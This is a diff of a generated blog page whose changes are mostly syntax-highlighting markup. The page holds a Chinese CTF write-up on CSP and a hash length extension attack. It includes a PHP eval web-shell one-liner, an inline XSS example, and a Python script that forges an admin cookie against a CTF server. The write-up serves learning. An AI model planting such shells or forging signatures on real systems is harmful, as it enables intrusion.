@@ -195,7 +195,7 @@
 <p>小生初来乍到,请多指教姿势~</p>
 </blockquote>
 <a id="more"></a>
-<h3 id="HTML标签执行PHP代码"><a href="#HTML标签执行PHP代码" class="headerlink" title="HTML标签执行PHP代码"></a>HTML标签执行PHP代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="HTML标签执行PHP代码"><a href="#HTML标签执行PHP代码" class="headerlink" title="HTML标签执行PHP代码"></a>HTML标签执行PHP代码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="undefined">@eval_r($_POST[sb])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="内容安全策略CSP"><a href="#内容安全策略CSP" class="headerlink" title="内容安全策略CSP"></a>内容安全策略CSP</h3><p>CSP定义了Content-Security-PolicyHTTP头来允许你创建一个可信来源的白名单，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。 </p>
 <p>CSP基于来源白名单，但是它不能解决XSS攻击的最大来源：内联脚本注入。如果攻击者可以注入包含有害代码的script标签（<code>&lt;script&gt;sendMyDataToEvilDotCom();&lt;/script&gt;</code>），浏览器并没有好的机制来区分这个标签。CSP只能通过完全禁止内联脚本来解决这个问题。</p>
 <pre><code>这个禁止项不仅包括脚本中嵌入的script标签，还包括内联事件处理程序和javascrpt:这种URL。你需要把script标签的内容放到一个外部文件里，并且用适当的addEventListener的方式替换javascript:和&lt;a… onclick=”[JAVASCRIPT]”&gt;。
@@ -211,9 +211,9 @@
 <li>猜测反序列化函数存在截断之类的问题(这是我开始的出发点，后来发现还不够，以及对md5过于信任 - - )</li>
 </ul>
 <h4 id="准备活动"><a href="#准备活动" class="headerlink" title="准备活动"></a>准备活动</h4><p>那么由我来介绍一下这个哈希长度扩展攻击工具使用方法，对了，他叫hashpump(python 库为 hashpumpy)<br>安装自己找教程，我就不废话了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashPump [-h帮助] [-t测试] [-s签名] [-d数据] [-a附加] [-k keylength]</span><br><span class="line">    HashPump生成字符串来利用容易受到哈希长度扩展攻击的签名。</span><br><span class="line">    -h --help显示此消息。</span><br><span class="line">    -t --test运行测试来验证每个算法是否正常运行。</span><br><span class="line">    -s --签名来自已知消息的签名。</span><br><span class="line">    -d --data来自已知消息的数据。</span><br><span class="line">    -a --additional您希望添加到已知邮件的信息。</span><br><span class="line">    -k --keylength长度在关键的字节被用于签署与原始消息。</span><br></pre></td></tr></table></figure>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashPump [-h帮助] [-t测试] [-s签名] [-d数据] [-a附加] [-k keylength]</span><br><span class="line">    HashPump生成字符串来利用容易受到哈希长度扩展攻击的签名。</span><br><span class="line">    -<span class="ruby">h --help显示此消息。</span></span><br><span class="line"><span class="ruby">    -t --test运行测试来验证每个算法是否正常运行。</span></span><br><span class="line"><span class="ruby">    -s --签名来自已知消息的签名。</span></span><br><span class="line"><span class="ruby">    -d --data来自已知消息的数据。</span></span><br><span class="line"><span class="ruby">    -a --additional您希望添加到已知邮件的信息。</span></span><br><span class="line"><span class="ruby">    -k --keylength长度在关键的字节被用于签署与原始消息。</span></span><br></pre></td></tr></table></figure>
 <p>怎么用呢，拿这个题为例子。进入原题看cookie</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role: s%3A5%3A%22admin%22%3B -&gt; s:5:&quot;admin&quot;;</span><br><span class="line">hsh: e8a976144ac46064ef25cf3cc963d6b1</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role: s<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>admin<span class="symbol">%22</span><span class="symbol">%3</span>B -&gt; s:<span class="number">5</span>:<span class="string">"admin"</span><span class="comment">;</span></span><br><span class="line"><span class="comment">hsh: e8a976144ac46064ef25cf3cc963d6b1</span></span><br></pre></td></tr></table></figure>
 <p>假设盐值的长度为40，那么我们将hsh中 <code>;&quot;tseug&quot;:5:s</code> 值转换为 <code>;&quot;nimda&quot;:5:s</code> 如何呢</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashpump</span><br><span class="line">Input Signature: e8a976144ac46064ef25cf3cc963d6b1</span><br><span class="line">Input Data: ;"tseug":5:s</span><br><span class="line">Input Key Length: 40</span><br><span class="line">Input Data to Add: ;"nimda":5:s</span><br><span class="line">21a8bcfaac1ddcd72555e27825361338</span><br><span class="line">;"tseug":5:s\x80\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00;"nimda":5:s</span><br></pre></td></tr></table></figure>
 <p>原本的 <code>md5($salt.strrev(serialize(&#39;guest&#39;)))</code>变成了<code>md5($salt.strrev(serialize(&#39;admin&#39;)))</code>。现在就一个问题了，盐值的长度是多少呢？我们需要了解一下下这个哈希长度攻击的一点点皮毛。</p>
@@ -221,9 +221,9 @@
 <p>深入理解哈希长度攻击可以看这个<a href="http://blog.nsfocus.net/hash-length-extension-attack/">文章</a>，也就是说，如果一个消息长度大于512bit，则会对消息按64字节分，其中8字节作为长度填充无效，故盐值范围为[0，56]。 </p>
 <h4 id="一击必杀"><a href="#一击必杀" class="headerlink" title="一击必杀"></a>一击必杀</h4><p>顺带说一下<code>hashpumpy</code>的用法，我windows上一直装不上，只能在linux下装，不知道你们能不能，，，</p>
 <p>这个库就一个方法，调用方式如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length)</span><br><span class="line">hexdigest       散列密文的长度</span><br><span class="line">original_data   部分已知的数据</span><br><span class="line">data_to_add     想要追加的数据</span><br><span class="line">key_length      未知数据的长度</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashpumpy.hashpump(hexdigest, original_data, dat<span class="built_in">a_to</span>_add, key_length)</span><br><span class="line">hexdigest       散列密文的长度</span><br><span class="line">original_data   部分已知的数据</span><br><span class="line">dat<span class="built_in">a_to</span>_add     想要追加的数据</span><br><span class="line">key_length      未知数据的长度</span><br></pre></td></tr></table></figure>
 <p><strong>漂亮的绝杀</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy,requests,sys,urllib</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;</span><br><span class="line">&#125;</span><br><span class="line">strs = (&apos;role=&apos;,&apos;; hsh=&apos;, &apos;;UM_distinctid=1643fc9a6c4ea-0c9dba36d1de31-4c332173-1fa400-1643fc9a6c53d9&apos;) </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    for i in range(0, 56):</span><br><span class="line">        temp = hashpumpy.hashpump(&apos;3a4727d57463f122833d9e732f94e4e0&apos;,&apos;;&quot;tseug&quot;:5:s&apos;,&apos;;&quot;nimda&quot;:5:s&apos;,i)</span><br><span class="line">        headers[&apos;Cookie&apos;] = str(strs[0]+urllib.quote(temp[1][::-1])+strs[1]+temp[0]+strs[2])</span><br><span class="line">        req = s.get(url=&apos;http://web.jarvisoj.com:32778/&apos;, headers=headers)</span><br><span class="line">        if len(req.content)!=210:</span><br><span class="line">            print(&apos;[+]result&apos;, req.content)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy,requests,sys,urllib</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">&#125;</span><br><span class="line">strs = (<span class="string">'role='</span>,<span class="string">'; hsh='</span>, <span class="string">';UM_distinctid=1643fc9a6c4ea-0c9dba36d1de31-4c332173-1fa400-1643fc9a6c53d9'</span>) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">56</span>):</span><br><span class="line">        temp = hashpumpy.hashpump(<span class="string">'3a4727d57463f122833d9e732f94e4e0'</span>,<span class="string">';"tseug":5:s'</span>,<span class="string">';"nimda":5:s'</span>,i)</span><br><span class="line">        headers[<span class="string">'Cookie'</span>] = str(strs[<span class="number">0</span>]+urllib.quote(temp[<span class="number">1</span>][::<span class="number">-1</span>])+strs[<span class="number">1</span>]+temp[<span class="number">0</span>]+strs[<span class="number">2</span>])</span><br><span class="line">        req = s.<span class="keyword">get</span>(url=<span class="string">'http://web.jarvisoj.com:32778/'</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> len(req.content)!=<span class="number">210</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'[+]result'</span>, req.content)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <h4 id="完美收尾"><a href="#完美收尾" class="headerlink" title="完美收尾"></a>完美收尾</h4><p>升级版工具，不需要已知数据即可直接追加数据进入散列密文中，工具叫<a href="https://github.com/amlweems/hexpand/blob/master/README.md">hexpand</a>，除了少要一个参数其他没有什么变化。</p>
 
       
@@ -481,107 +481,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模板</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">JSP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">基础</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编码</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">install</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安装</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">配置</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">内网</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">question</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">小文</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -593,7 +493,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -602,6 +506,78 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">模板</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">小文</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编码</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">question</a>
               </li>
             
             <div class="clearfix"></div>
